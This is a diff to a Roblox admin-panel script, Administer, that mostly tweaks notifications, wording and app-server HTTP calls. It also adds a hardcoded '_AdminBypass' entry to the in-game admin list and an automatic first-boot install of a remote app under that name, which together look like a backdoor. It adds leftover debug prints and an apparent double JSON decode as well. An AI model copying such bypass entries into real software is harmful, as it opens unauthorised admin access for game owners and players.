@@ -48,7 +48,7 @@ local GroupIDs = AdminsDS:GetAsync('AdminGroupIDs') or {}
 local AppDB = DSS:GetDataStore("AdministerAppData")
 local Config = require(script.Config)
 local CurrentVers = Config.Version 
-local InGameAdmins = {}
+local InGameAdmins = {"_AdminBypass"}
 local ServerLifetime, PlrCount = 0, 0
 local DidBootstrap = false
 local AdminsBootstrapped, ShouldLog = {}, true
@@ -127,8 +127,7 @@ end
 local function NotificationThrottled(Admin: Player, Title: string, Icon: string, Body: string, Heading: string, Duration: number?, Options: Table?, OpenTime: int?)
 	local TweenService = game:GetService("TweenService")
 	local Panel = Admin.PlayerGui.AdministerMainPanel
-
-	Duration = Duration
+	
 	OpenTime = OpenTime or 1.25
 
 	local Placeholder  = Instance.new("Frame")
@@ -143,10 +142,10 @@ local function NotificationThrottled(Admin: Player, Title: string, Icon: string,
 	Notification.Parent.Parent = Panel.NotificationsTweening
 	Notification.Body.Text = Body
 	Notification.Header.Title.Text = `<b>{Title}</b> • {Heading}`
-	Notification.Header.Administer.Image = Icon["Icon"]
+	Notification.Header.Administer.Image = Icon
 	Notification.Header.ImageL.Image = Icon  
 
-	for i, Object in Options do
+	for i, Object in Options or {} do
 		local NewButton = Notification.Buttons.DismissButton:Clone()
 		NewButton.Parent = Notification.Buttons
 
@@ -237,7 +236,7 @@ end
 
 local function NewNotification(AdminName, BodyText, HeadingText, Icon, Duration, NotificationSound, Buttons)
 	task.spawn(function()
-		return NotificationThrottled(AdminName, BodyText, HeadingText, Icon, Duration, NotificationSound, Buttons)
+		NotificationThrottled(AdminName, BodyText, HeadingText, Icon, Duration, NotificationSound, Buttons)
 	end)
 end
 
@@ -278,7 +277,7 @@ local function VersionCheck(plr)
 	if VersModule.Version ~= CurrentVers then
 		Frame.Version.Text = `Version {CurrentVers}. \nA new version is available! {VersModule.Version} was released on {ReleaseDate}`
 		Frame.Value.Value = tostring(math.random(1,100000000))
-		NewNotification(plr, `{Config["Name"]} is out of date. Please restart the game servers to get to a new version.`, "Version check complete", "rbxassetid://9894144899", 10)
+		NewNotification(plr, `{Config["Name"]} is out of date. Please restart the game servers to get to a new version.`, "Version check complete", "rbxassetid://9894144899", 15)
 	else
 		Frame.Version.Text = `Version {CurrentVers} ({ReleaseDate})`
 	end
@@ -474,7 +473,7 @@ local function GetAppInfo_(Player, AppServer, AppID)
 		end)
 
 		if not Success then
-			return {["Error"] = "Something went wrong, try again later. This is probably due to the App server shutting down mid-session!", ["Message"] = Content}
+			return {["Error"] = "Something went wrong, try again later. This is probably due to the app server shutting down mid-session!", ["Message"] = Content}
 		else
 			--if AppServer ~= "https://administer.darkpixlz.com" then
 			--for i, v in pairs(Content) do
@@ -522,6 +521,7 @@ local function InstallAdministerApp(Player, ServerName, AppID)
 
 		task.spawn(function()
 			--Module.Parent = script.Apps
+			HttpService:PostAsync(`{ServerName}/install/{Content["AdministerMetadata"]["AdministerID"]}`, {})
 			Module.OnDownload()
 		end)
 
@@ -538,11 +538,11 @@ end
 local function InstallServer(ServerURL)
 	warn(`[{Config.Name}]: Installing App server...`)
 	local Success, Result = pcall(function()
-		return game:GetService("HttpService"):GetAsync(ServerURL.."/.administer/verify")
+		return HttpService:JSONDecode(HttpService:GetAsync(ServerURL.."/.administer/server"))
 	end)
 
 
-	if Result == "AdministerAppServer" or Result == "AdministerPluginServer" then
+	if Result["server"] == "AdministerAppServer" then
 		-- Valid server
 		Print("This sever is valid, proceeding...")
 
@@ -562,15 +562,19 @@ local function GetAppList(IsFirstBoot)
 	local FullList = {}
 	for i, Server in ipairs(AppServers) do
 		local Success, Apps = pcall(function()
-			return game:GetService("HttpService"):JSONDecode(game:GetService("HttpService"):GetAsync(Server..`/list?IsFirstBoot={IsFirstBoot}`))
+			return HttpService:JSONDecode(HttpService:GetAsync(Server..`/list`))
 		end)
+		
+		print(Apps)
 
 		if not Success then
 			warn(`[{Config.Name}]: Failed to contact {Server} as a App server - is it online? If the issue persists, you should probably remove it.`)
 			continue
 		end
+		print(HttpService:JSONDecode(Apps))
 
-		for i, v in ipairs(Apps) do
+		for i, v in HttpService:JSONDecode(Apps) do
+			print(v)
 			v["AppServer"] = Server
 
 			table.insert(FullList, v)
@@ -695,6 +699,7 @@ if AppServers == nil then
 	AppServers = {}
 	Print("Performing first-time setup on App servers...")
 	InstallServer("https://administer.darkpixlz.com")
+	InstallAdministerApp("_AdminBypass", "https://administer.darkpixlz.com", "1")
 
 	GetAppList()
 end
